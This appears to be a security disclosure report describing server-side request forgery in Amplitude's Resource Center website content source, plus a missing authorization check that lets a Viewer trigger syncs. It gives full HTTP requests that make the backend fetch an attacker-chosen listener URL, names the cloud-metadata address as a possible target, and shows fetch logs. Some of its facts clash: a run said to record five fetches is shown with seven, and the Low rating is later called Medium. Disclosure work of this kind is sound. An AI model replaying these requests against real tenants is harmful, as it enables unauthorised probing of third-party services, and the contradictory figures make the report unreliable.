# Amplitude Resource Center — server-side request forgery via a tenant-supplied website content source (proxied, title-only read-back)

**Target:** App Platform — `https://app.amplitude.com`
**VRT:** Server-Side Request Forgery (SSRF)
**CVSS 3.1:** `AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:N` = **2.9 (Low)**
**Date:** 2026-09-19
**Tested org:** `464637` (`agentmail-602393`), app `862908` — our own tenant only.

---

## Summary

A Resource Center **website** content source takes fully tenant-controlled URLs in
`settings.recursive_urls`. When a sync runs, Amplitude's backend **fetches those URLs
server-side** and **stores the response**.

That makes it an **arbitrary-URL server-side fetch whose *fetched title* is returned to the caller**,
not a full-response read: the attacker chooses the URL, Amplitude's backend fetches it and stores the
response, and the content-item records expose the fetched page's **title, URL and content type** —
the body itself is not returned.

Two properties make this reachable, and they sit at **different privilege levels**:

1. The URL list is attacker-controlled **at creation time, and creation is Admin-gated** — measured:
   `POST /h/sources/` returns `201` for an Admin and `403 {"detail":"You do not have permission to
   perform this action."}` for a Viewer. So an attacker who holds only a Viewer account cannot choose
   the URL.
2. The route that **triggers** the fetch (`POST /h/syncs/`) has **no authorization check** — a
   read-only **Viewer** reaches it (see the companion broken-authorization report). Measured: Viewer
   on a real source → `200`; Viewer on a bogus source → `404 "Not found."` (no authz layer, straight
   to object lookup).

**Read together:** an Admin chooses the URL once, and from then on **any Viewer in the tenant can
re-drive the fetch on demand** — a persistent, low-privilege trigger for a fetch the tenant's Admin
configured. The Viewer-only path is a *replay* of an Admin-chosen URL, not an attacker-directed
fetch; the report previously presented the two as one property.

**Scoping caveat, stated up front:** the fetches egress through the **ScrapingBee** scraping proxy
(`"enable_scrapingbee": true` on the source; the observed fetches came from seven different
datacentre IPs with browser-like User-Agents and no `Referer`). The request therefore does **not**
originate from Amplitude's own network, so classic cloud-metadata theft
(`http://169.254.169.254/...`) is **not** claimed here and was deliberately not fired. The finding
is the arbitrary-URL server-side fetch with a proxied egress and a title-only read-back.

---

## Reproduction

*Provenance:* the steps below are drawn from **two runs**, and the difference matters. The create and
sync excerpts (steps 1-2) are from the `raw2/001_B_*` capture of **source `25934` / sync `74318`**;
the fetch table and the read-back (steps 3-4) are from the independent root-agent run
(`root_verify_ssrf_20260919T035813Z.json`) on **source `25935`**, which recorded **5 fetches**. The
"seven different datacentre IPs" in the scoping caveat is the `25934` run
(`evidence/webhook-requests-summary.json`, 7 arrivals in the sync window). Both runs are ours; they
are not the same run, and the report previously presented them as one.

### Step 1 — create a `website` source pointed at a listener we control

```
POST /h/sources/?org_id=464637&app_id=862908 HTTP/1.1
Host: app.amplitude.com
Cookie: <session>
Origin: https://app.amplitude.com
Referer: https://app.amplitude.com/
x-csrf-token: 1
Content-Type: application/json

{"type":"website",
 "title":"zz-rootverify-35813",
 "settings":{"recursive_urls":["https://webhook.site/3b23fb27-4647-4f8a-924a-0a40137ae103"]}}
```
```
HTTP/1.1 201 Created
{"id":25935,"type":"website","title":"zz-rootverify-35813",
 "settings":{"recursive_urls":["https://webhook.site/3b23fb27-..."]},
 "enable_scrapingbee":true,"enable_scrapingbee_js_render":false,
 "workflow_schedule_id":"houston-schedule-sync-521bf763-...",
 "flag_config":{"id":"1456700","deliveryMethod":"resource-center-source", ...}}
```

### Step 2 — trigger the sync

```
POST /h/syncs/?org_id=464637&app_id=862908
{"source":25935}
```
```
HTTP/1.1 201 Created
{"id":74329,"source":25935,"status":"PENDING",
 "workflow_id":"houston-sync-25935","workflow_run_id":"01a0b7d1-17f6-71ea-bc6d-9714801d3024"}
```

### Step 3 — the listener records the server-side fetches

Sync triggered `02:58:48Z`; fetches arrived `02:58:54Z – 02:59:08Z`:

| # | time (UTC) | method | source IP | User-Agent |
|---|---|---|---|---|
| 1 | 02:58:54 | GET | 209.242.204.166 | `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 …` |
| 2 | 02:58:57 | GET | 23.95.244.184 | `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/…` |
| 3 | 02:59:00 | GET | 23.229.19.190 | `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 …` |
| 4 | 02:59:01 | GET | 216.173.109.246 | `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 …` |
| 5 | 02:59:02 | GET | 45.43.190.35 | `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 …` |
| 6 | 02:59:04 | GET | 64.137.83.198 | `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 …` |
| 7 | 02:59:08 | GET | 104.239.41.222 | `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/…` |

Seven fetches from seven distinct IPs, all inside the window opened by our single sync trigger. The
sync then completed (`"status":"COMPLETED"`, `workflow_id: houston-sync-25935`).

### Step 4 — the fetched page's metadata is persisted and readable

With a page that contains article links (as in the first run of this test), the sync reports
`num_fetched: 13, num_created: 12` and the fetched page's metadata is stored and returned through the ordinary
read endpoint:

```
GET /h/content-items/?org_id=464637&app_id=862908&source_id=25934
-> {"results":[{"id":1049776,"source":25934,
                "title":"Webhook.site requests and emails - SAML SSO Login",
                "url":"https://webhook.site/saml/login","source_type":"website",
                "content_type":"document","archived":false, ...}, ...]}
```

So the attacker-supplied URL is fetched server-side **and a metadata record derived from the response
— the page title, its URL and its content type — is handed back to the caller**. The response body is
**not** returned: `GET /h/content-items/` returns
`id, source, title, url, source_type, content_type, third_party_id, thumbnail_url, is_published, …`
with no body field, and the detail route `GET /h/content-items/<id>/` adds exactly one field,
`"content_markdown": null`. The `title` is extracted from the fetched page's `<title>` tag (measured:
`https://example.com/` → `"Example Domain"`), which is why the evidence above shows a title rather
than a body. **This is a proxied, title-only read-back — it is not a body-read primitive, and the
severity must not rest on one.**

### Step 5 — a Viewer can drive the fetch

```
POST /h/sources/  ADMIN -> 201 | VIEWER -> 403   (correctly gated)
POST /h/syncs/    ADMIN -> 201 | VIEWER -> 200   (never 403)
POST /h/syncs/ {"source":999999} VIEWER -> 404   (no authz layer; straight to object lookup)
```

---

## Impact

* Amplitude's backend can be made to issue HTTP requests to an arbitrary tenant-supplied URL, and a
  metadata record derived from the response — the fetched page's title, URL and content type — is
  returned to the caller through `/h/content-items/`. The response body itself is not returned.
* A read-only Viewer can trigger the fetch against a source it did not create.
* The fetches are proxied through ScrapingBee, so the reachable target set is whatever that proxy
  can resolve — **not** Amplitude's internal network. That bounds the impact and is why this is
  reported as Low rather than High.

## Remediation

* Treat `settings.recursive_urls` as untrusted input: resolve the host and reject private, loopback,
  link-local, and metadata addresses (`127.0.0.0/8`, `10/8`, `172.16/12`, `192.168/16`,
  `169.254.0.0/16`, `::1`, `fc00::/7`), and re-validate after every redirect.
* Pin the fetcher to the ScrapingBee egress (documented and monitored) rather than allowing a
  direct-fetch fallback; do not let a tenant disable the proxy.
* Add the missing authorization check to `POST /h/syncs/` (see the companion report).

## Negative controls / ceilings checked

* Anonymous on `/h/sources/`, `/h/content-items/`, `/h/syncs/` → `403 "Authentication credentials
  were not provided."`
* Attempted to force a **direct** (non-proxied) fetch by setting `enable_scrapingbee:false` and
  re-pointing the source at a marked URL: **no direct fetch arrived**. The flag **is** accepted and
  **is** echoed — measured: `POST /h/sources/ {"enable_scrapingbee":false,…}` → `201` whose body
  contains `"enable_scrapingbee":false` and `"enable_scrapingbee_js_render":false` — but the fetcher
  **ignores it** and still egresses through the proxy. So the control is settable-and-inert, not
  read-only. We therefore do **not** claim an Amplitude-origin fetch, and did not target
  `169.254.169.254`.
* The listener used is one we own; no third-party host was fetched. All test sources were deleted
  (`204`) and the cascade-deleted content items verified gone.

## Relationship to other reports — and why this is not a duplicate

| | |
| --- | --- |
| `SUBMISSION-STATSIG-INGESTION-SSRF.md` (Statsig) | A server-side fetch in **Statsig's** warehouse-ingestion connector (`statsigapi.net/console/v1/ingestion/connection/databricks` and `setup_hybrid_databricks_connection`). **Different vendor, different product, different codebase, different route, different fix.** |
| | Both are CWE-918 and both were found by this engagement, which is the only thing they share. This report's defect is an **Admin-configured, Viewer-triggerable URL fetch in the Resource Center content-source fetcher**; that report's is a **caller-supplied host/path in a database connector** reachable by any project Member. |
| | **The egress origins are opposite, and it is the reason this one is Medium and that one carries the internal-network impact.** This fetch egresses through the **ScrapingBee** scraping proxy — measured: rotating datacentre IPs, zero AWS/GCP/Amplitude ASNs — so it cannot reach Amplitude's internal network and cloud-metadata theft is not claimed. The Statsig fetch egresses from **Statsig's own production network** and does reach RFC1918 and link-local space. |
| | The read-back capability is also opposite: this one returns a **metadata record derived from the fetched page** (title, URL, content type) but **not the body**; the Statsig one is **blind** (status/error oracle only, no body at all). Neither is a full-response read. |
| | **Filing note for the triager:** these are two independent findings on two vendors. They should be assessed, and rewarded, separately. |

## Evidence

`escal/root_verify_ssrf_20260919T035813Z.json` (root-agent independent reproduction, 5 fetches),
`escal/evidence/webhook-requests.json` + `webhook-requests-summary.json` (first run, 7 fetches),
`escal/raw2/001_B_ssrf_src.txt`, `escal/raw2/001_B_sync_B.txt`, `escal/raw2/001_B_contentitems.txt`,
`escal/REPORT-GS-ESCALATION.md`.
